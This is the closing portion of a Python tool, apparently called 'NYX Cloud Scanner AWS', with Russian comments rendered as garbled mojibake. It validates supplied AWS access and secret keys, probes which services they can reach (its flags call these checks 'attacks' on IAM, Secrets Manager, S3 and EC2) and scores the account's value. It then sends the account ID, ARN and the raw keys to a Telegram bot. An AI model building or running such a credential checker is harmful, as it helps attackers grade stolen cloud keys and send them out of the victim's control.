        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–∞–º—ã–µ –º–µ–¥–ª–µ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
        if stats['service_response_times']:
            avg_times = {}
            for service, times in stats['service_response_times'].items():
                if times:
                    avg_times[service] = sum(times) / len(times)
            
            if avg_times:
                slowest_services = sorted(avg_times.items(), key=lambda x: x[1], reverse=True)[:3]
                print(f"  –°–∞–º—ã–µ –º–µ–¥–ª–µ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã:")
                for service, avg_time in slowest_services:
                    print(f"    ‚Ä¢ {service}: {Fore.YELLOW}{avg_time:.2f}s{Fore.RESET}")
        
        print()
    
    def get_account_category(self, score: int) -> Dict[str, Any]:
        """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∫–∞—Ç–µ–≥–æ—Ä–∏—é –∞–∫–∫–∞—É–Ω—Ç–∞ –ø–æ —Å—á–µ—Ç—É"""
        for category_key, category_info in self.account_categories.items():
            if score >= category_info['min_score']:
                return {**category_info, 'key': category_key}
        return self.account_categories['minimal']

# ============================================================================
# MAIN APPLICATION
# ============================================================================

def print_banner():
    """–í—ã–≤–æ–¥–∏—Ç –∫—Ä–∞—Å–∏–≤—ã–π –±–∞–Ω–Ω–µ—Ä"""
    print()
    print(f"{Fore.YELLOW}      üîç NYX CLOUD SCANNER AWS üîç{Fore.RESET}")
    print(f"{Fore.WHITE}Professional AWS Security Analysis Module{Fore.RESET}")
    print(f"{Fore.CYAN}{'‚îÄ'*50}{Fore.RESET}")
    print()

def print_section(title: str, color: str = Fore.CYAN):
    """–í—ã–≤–æ–¥–∏—Ç –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Å–µ–∫—Ü–∏–∏"""
    print(f"\n{color}{'='*60}")
    print(f"{Style.BRIGHT}{title}")
    print(f"{'='*60}{Fore.RESET}")

def print_result_line(label: str, value: str, color: str = Fore.WHITE):
    """–í—ã–≤–æ–¥–∏—Ç —Å—Ç—Ä–æ–∫—É —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞"""
    print(f"{Fore.BLUE}  {label}:{Fore.RESET} {color}{value}{Fore.RESET}")

def print_service_status(service: str, accessible: bool, score: int):
    """–í—ã–≤–æ–¥–∏—Ç —Å—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–∏—Å–∞"""
    status = f"{Fore.GREEN}‚úÖ –î–û–°–¢–£–ü–ï–ù{Fore.RESET}" if accessible else f"{Fore.RED}‚ùå –ù–ï –î–û–°–¢–£–ü–ï–ù{Fore.RESET}"
    print(f"    {service:<25} {status} {Fore.YELLOW}({score} pts){Fore.RESET}")

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    print_banner()
    
    # –ó–∞–≥—Ä—É–∂–∞–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
    load_dotenv()
    
    # –ü–æ–ª—É—á–∞–µ–º –∞—Ä–≥—É–º–µ–Ω—Ç—ã –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
    parser = argparse.ArgumentParser(description='AWS Key Checker - Professional Security Analysis')
    parser.add_argument('--access-key', '-a', required=True, help='AWS Access Key ID')
    parser.add_argument('--secret-key', '-s', required=True, help='AWS Secret Access Key')
    parser.add_argument('--region', '-r', default='us-east-1', help='AWS Region (default: us-east-1)')
    
    # –§–ª–∞–≥–∏ –¥–ª—è —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –ø–æ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞–º
    parser.add_argument('--critical', action='store_true', help='–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–ª—å–∫–æ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ –∞—Ç–∞–∫–∏ (IAM, Secrets, Systems Manager, S3, EC2, Lambda, RDS)')
    parser.add_argument('--high', action='store_true', help='–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–ª—å–∫–æ –≤—ã—Å–æ–∫–æ–ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω—ã–µ –∞—Ç–∞–∫–∏ (Security & Compliance)')
    parser.add_argument('--medium', action='store_true', help='–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–ª—å–∫–æ —Å—Ä–µ–¥–Ω–µ–ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω—ã–µ –∞—Ç–∞–∫–∏ (IAM Groups, Container Services)')
    parser.add_argument('--low', action='store_true', help='–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–ª—å–∫–æ –Ω–∏–∑–∫–æ–ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω—ã–µ –∞—Ç–∞–∫–∏ (Management)')
    
    args = parser.parse_args()
    
    # –ü–æ–ª—É—á–∞–µ–º —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    access_key = args.access_key
    secret_key = args.secret_key
    region = args.region
    
    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ñ–∏–ª—å—Ç—Ä—ã –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ñ–ª–∞–≥–æ–≤
    filters = {
        'critical': args.critical,
        'high': args.high,
        'medium': args.medium,
        'low': args.low
    }
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–Ω—Ñ–ª–∏–∫—Ç—ã —Ñ–ª–∞–≥–æ–≤
    priority_flags = [args.critical, args.high, args.medium, args.low]
    
    if sum(priority_flags) > 1:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞: –ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ñ–ª–∞–≥ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–∞ (--critical, --high, --medium, --low){Fore.RESET}")
        return
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã
    validator = AWSKeyValidator()
    
    # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    chat_id = os.getenv('TELEGRAM_CHAT_ID')
    telegram_notifier = TelegramNotifier(bot_token, chat_id) if bot_token and chat_id else None
    
    # Telegram —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —É–∂–µ –≤—ã–≤–æ–¥—è—Ç—Å—è –≤ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä–µ TelegramNotifier
    
    start_time = time.time()
    
    try:
        # –í–∞–ª–∏–¥–∏—Ä—É–µ–º –∫–ª—é—á–∏
        validation_result = validator.validate_key(access_key, secret_key, region)
        
        if not validation_result['success']:
            print(f"{Fore.RED}‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: {validation_result['error']}{Fore.RESET}")
            if telegram_notifier:
                telegram_notifier.send_message(f"‚ùå <b>–û–®–ò–ë–ö–ê –í–ê–õ–ò–î–ê–¶–ò–ò</b>\n\n–ù–µ–≤–µ—Ä–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: {validation_result['error']}")
            sys.exit(1)
        
        print(f"  Account ID: {Fore.GREEN}{validation_result['account_id']}{Fore.RESET}")
        print(f"  Username: {Fore.GREEN}{validation_result['username']}{Fore.RESET}")
        print(f"  ARN: {Fore.GREEN}{validation_result['arn']}{Fore.RESET}")
        print(f"  Region: {Fore.GREEN}{region}{Fore.RESET}")
        print(f"{Fore.CYAN}{'‚îÄ'*50}{Fore.RESET}")
        print()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞
        permissions_result = validator.check_service_permissions(access_key, secret_key, region, filters)
        
        if 'error' in permissions_result:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤: {permissions_result['error']}{Fore.RESET}")
            sys.exit(1)
        
        # –ü–æ–¥—Å—á–∏—Ç—ã–≤–∞–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
        accessible_count = sum(1 for result in permissions_result['results'].values() if result['accessible'])
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–∞—Ç–µ–≥–æ—Ä–∏—é –∞–∫–∫–∞—É–Ω—Ç–∞
        total_score = permissions_result['total_score']
        category = validator.get_account_category(total_score)
        
        print(f"{Fore.CYAN}{'‚îÄ'*50}{Fore.RESET}")
        print()
        print(f"  –û–±—â–∏–π —Å—á–µ—Ç: {Fore.YELLOW}{total_score}/60{Fore.RESET}")
        print(f"  –ö–∞—Ç–µ–≥–æ—Ä–∏—è: {Fore.YELLOW}{category['emoji']} {category['name']}{Fore.RESET}")
        print(f"  –î–æ—Å—Ç—É–ø–Ω–æ —Å–µ—Ä–≤–∏—Å–æ–≤: {Fore.YELLOW}{accessible_count}/{len(permissions_result['results'])}{Fore.RESET}")
        
        execution_time = time.time() - start_time
        print(f"  –í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {Fore.YELLOW}{execution_time:.2f} —Å–µ–∫{Fore.RESET}")
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤ Telegram
        if telegram_notifier:
            notification_data = {
                'account_id': validation_result['account_id'],
                'username': validation_result['username'],
                'arn': validation_result['arn'],
                'access_key': access_key,
                'secret_key': secret_key,
                'region': region,
                'score': total_score,
                'category': category['name'],
                'accessible_services': accessible_count,
                'total_services': len(permissions_result['results']),
                'execution_time': execution_time,
                'accessible_services_list': permissions_result['accessible_services']
            }
            
            success = telegram_notifier.send_validation_result(notification_data)
            if success:
                print()
                print(f"‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram!")
            else:
                print()
                print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram")
        
        print(f"{Fore.CYAN}{'‚îÄ'*50}{Fore.RESET}")
        print()
        print(f"{Fore.GREEN}‚úÖ –í—Å–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω—ã —É—Å–ø–µ—à–Ω–æ!{Fore.RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}‚èπÔ∏è –ê–Ω–∞–ª–∏–∑ –ø—Ä–µ—Ä–≤–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}‚ùå –ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}{Fore.RESET}")
        if telegram_notifier:
            telegram_notifier.send_message(f"‚ùå <b>–û–®–ò–ë–ö–ê –ê–ù–ê–õ–ò–ó–ê</b>\n\n–ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
